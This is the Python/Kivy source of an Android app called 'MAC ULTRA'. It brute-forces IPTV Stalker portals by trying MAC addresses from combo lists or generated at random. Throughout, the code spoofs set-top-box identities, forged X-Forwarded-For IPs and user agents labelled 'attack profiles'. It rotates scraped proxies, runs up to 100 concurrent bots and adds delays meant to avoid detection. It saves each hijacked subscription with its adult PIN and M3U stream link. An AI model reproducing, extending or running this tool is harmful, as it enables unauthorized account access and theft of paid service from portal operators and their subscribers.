import os, asyncio, time, urllib.parse, urllib.request, httpx, random, ssl, json, socket, uuid
from datetime import datetime
from threading import Thread

from kivy.uix.boxlayout import BoxLayout
from kivy.uix.gridlayout import GridLayout
from kivy.uix.label import Label
from kivy.uix.spinner import Spinner
from kivy.uix.button import Button
from kivy.uix.scrollview import ScrollView
from kivy.uix.textinput import TextInput
from kivy.uix.slider import Slider
from kivy.uix.progressbar import ProgressBar
from kivy.uix.image import Image
from kivy.uix.modalview import ModalView
from kivy.core.clipboard import Clipboard
from kivy.graphics import Color, RoundedRectangle
from kivy.uix.screenmanager import Screen
from kivy.clock import Clock
from kivy.core.window import Window

# --- Musik Integration ---
try:
    from jnius import autoclass
    MediaPlayer = autoclass('android.media.MediaPlayer')
    mPlayer = MediaPlayer()
    HAS_JNIUS = True
except:
    HAS_JNIUS = False

# --- KONSTANTEN ---
ATTACK_PROFILES = [
    {'User-Agent': 'Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 4 rev: 2721', 'X-User-Agent': 'Model: MAG254; Link: Ethernet'},
    {'User-Agent': 'Mozilla/5.0 (Linux; Android 14; Pixel 8 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Mobile Safari/537.36'},
    {'User-Agent': 'okhttp/4.9.1'}
]
GEO_DATA = {
    'IT': {'ip': ['151', '185', '79', '93'], 'lang': 'it-IT,it;q=0.9', 'tz': 'Europe/Rome'},
    'DE': {'ip': ['85', '188', '93', '95'], 'lang': 'de-DE,de;q=0.9', 'tz': 'Europe/Berlin'},
    'FR': {'ip': ['5', '80', '78', '176'], 'lang': 'fr-FR,fr;q=0.9', 'tz': 'Europe/Paris'}
}

BG_DARK = (0.01, 0.02, 0.04, 1)
CARD_COLOR = (0.05, 0.07, 0.12, 1)
CYAN = (0, 0.9, 1, 1)
GREEN = (0, 1, 0.5, 1)
RED = (1, 0.2, 0.2, 1)
YELLOW = (1, 0.8, 0, 1)
WHITE = (1, 1, 1, 1)
MAC_VARIANTS = ('00:1A:79:', 'D4:CF:F9:', '33:44:CF:', '10:27:BE:', 'A0:BB:3E:', '55:93:EA:', '04:D6:AA:', '00:1B:79:', '00:2A:01:')

# --- UI KLASSEN ---
class StyledCard(BoxLayout):
    def __init__(self, bg_color=CARD_COLOR, radius=[15,], **kwargs):
        super().__init__(**kwargs)
        with self.canvas.before:
            self.bg_color_inst = Color(*bg_color)
            self.rect = RoundedRectangle(pos=self.pos, size=self.size, radius=radius)
        self.bind(pos=self.update_rect, size=self.update_rect)
    def update_rect(self, *args): self.rect.pos, self.rect.size = self.pos, self.size

class StyledButton(Button):
    def __init__(self, bg_color=CARD_COLOR, radius=[10,], **kwargs):
        super().__init__(**kwargs)
        self.background_normal, self.background_color = "", (0,0,0,0)
        with self.canvas.before:
            self.bg_color_inst = Color(*bg_color)
            self.rect = RoundedRectangle(pos=self.pos, size=self.size, radius=radius)
        self.bind(pos=self.update_rect, size=self.update_rect)
    def update_rect(self, *args): self.rect.pos, self.rect.size = self.pos, self.size

class StyledSpinner(Spinner):
    def __init__(self, bg_color=CARD_COLOR, radius=[10,], **kwargs):
        super().__init__(**kwargs)
        self.background_normal, self.background_color = "", (0,0,0,0)
        with self.canvas.before:
            self.bg_color_inst = Color(*bg_color)
            self.rect = RoundedRectangle(pos=self.pos, size=self.size, radius=radius)
        self.bind(pos=self.update_rect, size=self.update_rect)
    def update_rect(self, *args): self.rect.pos, self.rect.size = self.pos, self.size

# --- PORTAL MANAGER ---
class PortalManagerView(ModalView):
    def __init__(self, main_screen, **kwargs):
        super().__init__(**kwargs)
        self.main_screen = main_screen
        self.size_hint = (0.95, 0.9)
        self.background_color = [0,0,0,0]
        self.fav_file = "/storage/emulated/0/Portals/favoriten_liste.json"
        
        layout = StyledCard(orientation="vertical", padding=20, spacing=15, bg_color=BG_DARK)
        layout.add_widget(Label(text="[color=00E6FF][b]MAC ULTRA FAVORITEN[/b][/color]", markup=True, size_hint_y=None, height=80, font_size="28sp"))
        self.new_portal = TextInput(hint_text="http://url.com:8080", multiline=False, height=70, background_color=(0.1, 0.1, 0.1, 1), foreground_color=WHITE)
        add_btn = StyledButton(text="HINZUFÜGEN", size_hint_y=None, height=70, bg_color=(0.05, 0.15, 0.1, 1), color=GREEN, on_press=self.add_portal)
        layout.add_widget(self.new_portal); layout.add_widget(add_btn)
        
        self.scroll = ScrollView()
        self.list_layout = GridLayout(cols=1, spacing=10, size_hint_y=None)
        self.list_layout.bind(minimum_height=self.list_layout.setter('height'))
        self.scroll.add_widget(self.list_layout)
        layout.add_widget(self.scroll)
        layout.add_widget(StyledButton(text="ZURÜCK", size_hint_y=None, height=80, on_press=self.dismiss, color=RED))
        self.add_widget(layout); self.load_favs()

    def load_favs(self):
        self.list_layout.clear_widgets()
        if not os.path.exists(self.fav_file): return
        try:
            with open(self.fav_file, 'r') as f: urls = json.load(f).get("mac", [])
            for url in urls:
                row = BoxLayout(size_hint_y=None, height=70, spacing=10)
                row.add_widget(StyledButton(text=url, on_press=lambda x, u=url: self.select(u)))
                del_btn = StyledButton(text="X", size_hint_x=0.2, color=RED, on_press=lambda x, u=url: self.delete(u))
                row.add_widget(del_btn); self.list_layout.add_widget(row)
        except: pass

    def add_portal(self, *a):
        url = self.new_portal.text.strip()
        if not url: return
        data = {"mac": []}
        if os.path.exists(self.fav_file):
            with open(self.fav_file, 'r') as f: data = json.load(f)
        if url not in data["mac"]:
            data["mac"].append(url); json.dump(data, open(self.fav_file, 'w')); self.load_favs()

    def delete(self, url):
        with open(self.fav_file, 'r') as f: data = json.load(f)
        data["mac"].remove(url); json.dump(data, open(self.fav_file, 'w')); self.load_favs()

    def select(self, url): self.main_screen.portal_input.text = url; self.dismiss()

# --- HAUPT SCREEN ---
class MagUltraScreen(Screen):
    def __init__(self, context, **kw):
        super().__init__(**kw)
        self.context = context
        self.box = BoxLayout(orientation="vertical", padding=[20, 35, 20, 20], spacing=15)
        Window.clearcolor = BG_DARK
        self.hits, self.checked, self.total_lines, self.running = 0, 0, 0, False
        self.hit_list, self.last_status, self.start_time = [], "READY", time.time()
        self.proxy_enabled = False
        self.proxies = []
        self.portal_isp = "N/A"
        self.setup_ui()

    def setup_ui(self):
        self.box.add_widget(Image(source=self.context["paths"]["png"], size_hint_y=None, height=320, allow_stretch=True, keep_ratio=False))
        stats = GridLayout(cols=3, size_hint_y=None, height=110, spacing=15)
        self.cpm_label = self.create_stat_box(stats, "CPM", "0", YELLOW)
        self.status_code_label = self.create_stat_box(stats, "STATUS", "READY", CYAN)
        self.hit_count_label = self.create_stat_box(stats, "MAC ULTRA HITS", "0", GREEN)
        self.box.add_widget(stats)
        
        url_card = StyledCard(orientation="vertical", size_hint_y=None, height=380, padding=15, spacing=12)
        self.portal_input = TextInput(text="http://", multiline=False, height=75, background_color=(0.1, 0.1, 0.1, 1), foreground_color=WHITE)
        row1 = BoxLayout(size_hint_y=None, height=60, spacing=10)
        self.portal_file_spinner = StyledSpinner(text="USE SINGLE", values=self.load_portal_lists(), size_hint_x=0.6, color=YELLOW)
        self.country_filter = TextInput(text="DE", size_hint_x=0.4, background_color=(0.1, 0.12, 0.15, 1), foreground_color=WHITE)
        row1.add_widget(self.portal_file_spinner); row1.add_widget(self.country_filter)
        
        btn_row = BoxLayout(spacing=15, size_hint_y=None, height=75)
        btn_row.add_widget(StyledButton(text="PASTE", on_press=lambda x: setattr(self.portal_input, 'text', Clipboard.paste()), color=CYAN))
        btn_row.add_widget(StyledButton(text="CLEAR", on_press=lambda x: setattr(self.portal_input, 'text', 'http://'), color=RED))
        btn_row.add_widget(StyledButton(text="FAVORITEN", on_press=lambda x: PortalManagerView(self).open(), color=YELLOW))
        url_card.add_widget(self.portal_input); url_card.add_widget(row1); url_card.add_widget(btn_row); self.box.add_widget(url_card)
        
        cfg_card = StyledCard(orientation="vertical", size_hint_y=None, height=340, padding=15, spacing=10)
        m_row = BoxLayout(spacing=10, size_hint_y=None, height=60)
        self.scan_mode = StyledSpinner(text="COMBO FILE", values=("COMBO FILE", "RANDOM SCAN"))
        self.random_count = TextInput(text="1000", input_filter="int", size_hint_x=0.3, background_color=(0.1,0.1,0.1,1), foreground_color=WHITE)
        self.prefix_spinner = StyledSpinner(text="MAC's", values=MAC_VARIANTS, color=YELLOW)
        m_row.add_widget(self.scan_mode); m_row.add_widget(self.random_count); m_row.add_widget(self.prefix_spinner)
        
        self.file_spinner = StyledSpinner(text="SELECT COMBO", values=self.load_combos(), height=60, color=CYAN)
        delay_row = BoxLayout(size_hint_y=None, height=60, spacing=10)
        self.delay_mode_spinner = StyledSpinner(text="NORMAL", values=("NORMAL", "SMART: 1-3s", "SMART: 2-4s", "SMART: 3-6s"), color=YELLOW)
        self.delay_slider = Slider(min=0.0, max=2.0, value=0.1, step=0.05, size_hint_x=0.4)
        delay_row.add_widget(self.delay_mode_spinner); delay_row.add_widget(self.delay_slider)
        bot_row = BoxLayout(size_hint_y=None, height=60, spacing=10)
        self.bot_label = Label(text="BOTS: 40", color=CYAN, size_hint_x=0.3)
        self.bot_slider = Slider(min=1, max=100, value=40, step=1, size_hint_x=0.7)
        self.bot_slider.bind(value=lambda i, v: setattr(self.bot_label, 'text', f"BOTS: {int(v)}"))
        bot_row.add_widget(self.bot_label); bot_row.add_widget(self.bot_slider)
        cfg_card.add_widget(m_row); cfg_card.add_widget(self.file_spinner); cfg_card.add_widget(delay_row); cfg_card.add_widget(bot_row); self.box.add_widget(cfg_card)
        
        proxy_card = StyledCard(size_hint_y=None, height=75, padding=10, spacing=10)
        self.proxy_source = StyledSpinner(text="FILE", values=("FILE", "FREE (ProxyScrape)"), size_hint_x=0.35)
        self.proxy_spinner = StyledSpinner(text="SELECT PROXY", values=self.load_proxies(), size_hint_x=0.35)
        self.proxy_toggle_btn = StyledButton(text="PROXY: OFF", size_hint_x=0.3, color=RED, on_press=self.toggle_proxy)
        proxy_card.add_widget(self.proxy_source); proxy_card.add_widget(self.proxy_spinner); proxy_card.add_widget(self.proxy_toggle_btn); self.box.add_widget(proxy_card)
        
        self.progress_label = Label(text="PROGRESS: 0 / 0", size_hint_y=None, height=20, color=CYAN)
        self.pbar = ProgressBar(max=100, value=0, size_hint_y=None, height=10)
        self.scroll = ScrollView()
        self.log_display = Label(text="Ready...", font_size="14sp", size_hint_y=None, markup=True, halign="left")
        self.log_display.bind(size=self.log_display.setter('text_size'))
        self.scroll.add_widget(self.log_display); self.box.add_widget(self.progress_label); self.box.add_widget(self.pbar); self.box.add_widget(self.scroll)
        
        bottom_row = BoxLayout(size_hint_y=None, height=110, spacing=15)
        self.start_btn = StyledButton(text="START MAC ULTRA", size_hint_x=0.7, on_press=self.toggle, bg_color=(0.05, 0.15, 0.1, 1), color=GREEN)
        self.music_stop_btn = StyledButton(text="STOP MUSIC", size_hint_x=0.3, bg_color=(0.15, 0.05, 0.05, 1), color=RED, on_press=self.stop_audio)
        bottom_row.add_widget(self.start_btn); bottom_row.add_widget(self.music_stop_btn); self.box.add_widget(bottom_row); self.add_widget(self.box)

    # --- ENGINE FUNKTIONEN ---
    def get_clean_time(self, raw):
        raw_str = str(raw).strip()
        if not raw_str or raw_str.lower() in ["none", "false", "0", "null"]: return "Unlimited", "Unlimited"
        if raw_str.isdigit() and len(raw_str) >= 9:
            try:
                dt = datetime.fromtimestamp(int(raw_str))
                return dt.strftime('%d.%m.%Y'), f"{(dt - datetime.now()).days} Tage"
            except: pass
        for fmt in ("%B %d, %Y", "%Y-%m-%d", "%d.%m.%Y", "%m/%d/%Y"):
            try:
                dt = datetime.strptime(raw_str, fmt)
                return dt.strftime('%d.%m.%Y'), f"{(dt - datetime.now()).days} Tage"
            except: continue
        return raw_str, "Unlimited"

    async def get_portal_isp_info(self, url):
        try:
            domain = url.split('//')[-1].split(':')[0]
            ip = socket.gethostbyname(domain)
            async with httpx.AsyncClient(timeout=5) as client:
                r = await client.get(f"http://ip-api.com/json/{ip}")
                d = r.json()
                return f"[{d.get('countryCode', '??')}] {d.get('isp', 'Unknown')} | {ip}"
        except: return "Unknown Provider | 0.0.0.0"

    async def process_check(self, mac, portal, client):
        try:
            geo_i = GEO_DATA.get(self.country_filter.text.upper(), GEO_DATA['DE'])
            fake_ip = f"{random.choice(geo_i['ip'])}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(2,254)}"
            prof = random.choice(ATTACK_PROFILES)
            sn, dev_id = "".join(random.choices("0123456789ABCDEF", k=13)), "".join(random.choices("0123456789ABCDEF", k=40))
            headers = { **prof, "X-Forwarded-For": fake_ip, "X-STB-SN": sn, "X-STB-Device-ID": dev_id, "Cookie": f"mac={urllib.parse.quote(mac)}; stb_lang=en; timezone={urllib.parse.quote(geo_i['tz'])};" }

            r = await client.get(f"{portal}/portal.php?type=stb&action=handshake&JsHttpRequest=1-xml", headers=headers)
            self.last_status = str(r.status_code)
            if r.status_code == 200 and 'token' in r.text:
                headers["Authorization"] = f"Bearer {r.json().get('js',{}).get('token')}"
                ri = await client.get(f"{portal}/portal.php?type=account_info&action=get_main_info&JsHttpRequest=1-xml", headers=headers)
                self.last_status = str(ri.status_code)
                if ri.status_code == 200:
                    js = ri.json().get('js', {})
                    exp, days = self.get_clean_time(js.get('end_date') or js.get('phone'))
                    cre_date, _ = self.get_clean_time(js.get('reg_date'))
                    p_name = portal.replace("http://", "").replace("https://", "").split(":")[0]
                    self.hits += 1
                    self.save_hit(portal, socket.gethostbyname(p_name), prof['User-Agent'], mac, exp, days, str(js.get('parent_password') or "0000"), 
                                  js.get('channels_count','0'), js.get('movies_count','0'), js.get('series_count','0'), 
                                  sn, dev_id, js.get('live_list',''), js.get('movie_list',''), js.get('series_list',''), 
                                  geo_i['tz'], str(js.get('active_cons','0')), str(js.get('max_connections','1')), False, cre_date)
                    self.update_log_safe(f"[color=808080][{p_name}][/color] [color=00FF80][HIT][/color] {mac} | [color=00FFFF]{days}[/color]")
        except: self.last_status = "ERR"

    async def engine(self):
        portals = [self.portal_input.text.strip().rstrip('/')]
        if self.portal_file_spinner.text != "USE SINGLE":
            path = f"/storage/emulated/0/Portals/{self.portal_file_spinner.text}"
            with open(path, 'r') as f: portals = [l.strip().rstrip('/') for l in f if l.strip()]

        self.proxies = await self.load_proxies_to_memory()
        
        for portal in portals:
            if not self.running: break
            self.update_log_safe("[color=00FFFF][SCAN][/color] Teste API Endpunkte...")
            self.portal_isp = await self.get_portal_isp_info(portal)
            self.update_log_safe(f"[color=FFFF00][INFO][/color] Server: {self.portal_isp}")

            if self.scan_mode.text == "COMBO FILE":
                path = f"/sdcard/Combo/{self.file_spinner.text}"
                with open(path, 'r', errors='ignore') as f: combo = [l.strip() for l in f if l.strip()]
            else:
                pfx = self.prefix_spinner.text if ":" in self.prefix_spinner.text else "00:1A:79:"
                combo = [f"{pfx}{':'.join([f'{random.randint(0,255):02X}' for _ in range(3)])}" for _ in range(int(self.random_count.text or 100))]

            self.total_lines, self.checked, self.hits, self.start_time = len(combo), 0, 0, time.time()
            Clock.schedule_once(lambda dt: setattr(self.pbar, 'max', self.total_lines))
            queue = asyncio.Queue()
            for l in combo: queue.put_nowait(l)
            await asyncio.gather(*[self.worker(queue, portal) for _ in range(int(self.bot_slider.value))])
        
        self.running = False; Clock.schedule_once(lambda dt: setattr(self.start_btn, 'text', "START MAC ULTRA"))

    async def worker(self, queue, portal):
        p = random.choice(self.proxies) if self.proxies else None
        async with httpx.AsyncClient(verify=False, timeout=12, proxy=f"http://{p}" if p else None) as client:
            while self.running and not queue.empty():
                mac = await queue.get()
                await self.process_check(mac, portal, client)
                self.checked += 1
                mode, sl = self.delay_mode_spinner.text, self.delay_slider.value
                d = random.uniform(1,3) if "1-3s" in mode else random.uniform(2,4) if "2-4s" in mode else random.uniform(3,6) if "3-6s" in mode else sl
                await asyncio.sleep(d); Clock.schedule_once(lambda dt: self.refresh_ui()); queue.task_done()

    # --- HIT BOX (GROSS V2/V5) ---
    def save_hit(self, portal, portal_ip, server_h, id_val, exp, days, pw, live, movies, series, sn, dev_id, l_list, m_list, s_list, tz_val, act, max_c, is_m3u=False, cre_date="N/A"):
        domain = portal.replace("http://", "").replace("https://", "").split(":")[0].split("/")[0]
        final_dir = "/storage/emulated/0/Hits/MAC-ULTRA-V5/"
        os.makedirs(final_dir, exist_ok=True)
        m3u = f"{portal}/get.php?mac={id_val}&type=m3u_plus&output=ts"
        box = f"""━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
  🛰️ 𝗠𝗔𝗖 𝗨𝗟𝗧𝗥𝗔 𝗛𝗜𝗧
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
  🔗 𝗣𝗼𝗿𝘁𝗮𝗹   : {portal}
  🌐 𝗜𝗣       : {portal_ip} ({self.portal_isp})
  📡 𝗦𝗲𝗿𝘃𝗲𝗿   : {server_h}
  🖥️ {'𝗨𝘀𝗲𝗿' if is_m3u else '𝗠𝗔𝗖'}      : {id_val}
  🔐 {'𝗣𝗮𝘀𝘀' if is_m3u else '𝗔𝗱𝘂𝗹𝘁'}     : {pw}
  📅 𝗖𝗿𝗲𝗮𝘁𝗲𝗱  : {cre_date}
  📅 𝗘𝘅𝗽𝗶𝗿𝘆   : {exp} (⌛ {days})
  🧱 𝗦𝗡        : {sn}
  📲 𝗗𝗲𝘃 𝗜𝗗   : {dev_id}
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
  📊 𝗦𝗧𝗔𝗧𝗜𝗦𝗧𝗜𝗞𝗘𝗡:
  🎬 Filme    : {movies}
  🎞️ Serien   : {series}
  📡 Live TV  : {live}
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
  🛸 𝗔𝗰𝘁𝗶𝘃𝗲    : {act}
  🛸 𝗠𝗮𝘅 𝗖𝗼𝗻𝗻. : {max_c}
  🛸 𝗭𝗼𝗻𝗲      : {tz_val}
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
  🔗 𝗠𝟯𝗨 𝗟𝗜𝗡𝗞:
  {m3u}
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
  🛰️ MAC ULTRA Scan: {time.strftime('%H:%M / %d.%m.%Y')}
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"""
        with open(os.path.join(final_dir, f"{domain}.txt"), "a", encoding="utf-8") as f: f.write(box)

    # --- UI & SYSTEM ---
    def toggle(self, *_):
        if not self.running:
            self.running = True; self.start_btn.text = "STOP SCAN"; self.play_audio()
            Thread(target=lambda: asyncio.run(self.engine()), daemon=True).start()
        else: self.running = False

    def toggle_proxy(self, *a):
        self.proxy_enabled = not self.proxy_enabled
        self.proxy_toggle_btn.text, self.proxy_toggle_btn.color = ("PROXY: ON", GREEN) if self.proxy_enabled else ("PROXY: OFF", RED)

    async def load_proxies_to_memory(self):
        if not self.proxy_enabled: return []
        if self.proxy_source.text == "FILE":
            path = f"/storage/emulated/0/proxies/{self.proxy_spinner.text}"
            return [l.strip() for l in open(path, 'r') if l.strip()] if os.path.exists(path) else []
        else:
            try:
                async with httpx.AsyncClient() as c:
                    r = await c.get("https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http")
                    return r.text.splitlines()
            except: return []

    def update_log_safe(self, t): Clock.schedule_once(lambda dt: self._do_log(t))
    def _do_log(self, t):
        self.hit_list.append(t)
        if len(self.hit_list) > 10: self.hit_list.pop(0)
        self.log_display.text = "\n".join(self.hit_list); self.log_display.height = self.log_display.texture_size[1] + 20

    def play_audio(self):
        if HAS_JNIUS:
            try: mPlayer.reset(); mPlayer.setDataSource(self.context["paths"]["mp3"]); mPlayer.prepare(); mPlayer.start()
            except: pass
    def stop_audio(self, *a):
        if HAS_JNIUS:
            try: mPlayer.stop()
            except: pass

    def refresh_ui(self, *a):
        self.pbar.value, self.hit_count_label.text = self.checked, str(self.hits)
        self.status_code_label.text = self.last_status
        self.progress_label.text = f"PROGRESS: {self.checked} / {self.total_lines}"
        el = time.time() - self.start_time
        if el > 0: self.cpm_label.text = str(int((self.checked / el) * 60))

    def create_stat_box(self, p, t, v, c):
        box = StyledCard(orientation="vertical", padding=8)
        box.add_widget(Label(text=t, font_size="11sp"))
        lbl = Label(text=v, font_size="24sp", bold=True, color=c)
        box.add_widget(lbl)
        p.add_widget(box)
        return lbl

    def load_combos(self): return sorted([f for f in os.listdir("/sdcard/Combo/") if f.endswith(".txt")]) if os.path.exists("/sdcard/Combo/") else []
    def load_proxies(self): return sorted([f for f in os.listdir("/storage/emulated/0/proxies/") if f.endswith(".txt")]) if os.path.exists("/storage/emulated/0/proxies/") else []
    def load_portal_lists(self): return sorted([f for f in os.listdir("/storage/emulated/0/Portals/") if f.endswith(".txt")]) + ["USE SINGLE"] if os.path.exists("/storage/emulated/0/Portals/") else ["USE SINGLE"]

def create_app_screen(context): return MagUltraScreen(context=context, name="main")
